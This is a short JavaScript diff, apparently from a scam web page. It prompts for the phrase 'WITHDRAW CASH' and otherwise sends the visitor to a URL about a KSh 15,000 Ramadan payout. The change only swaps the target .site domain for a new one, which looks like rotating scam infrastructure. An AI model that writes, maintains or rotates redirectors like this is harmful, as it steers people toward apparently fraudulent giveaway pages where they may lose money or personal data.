@@ -4,5 +4,5 @@ password = prompt(
   'WITHDRAW CASH'
 );
 if (password != 'WITHDRAW CASH') {
-  location.href = 'https://www.ubonowo.site/ksh15000-joho-ramadan';
+  location.href = 'https://www.efereeitid.site/ksh15000-joho-ramadan';
 }
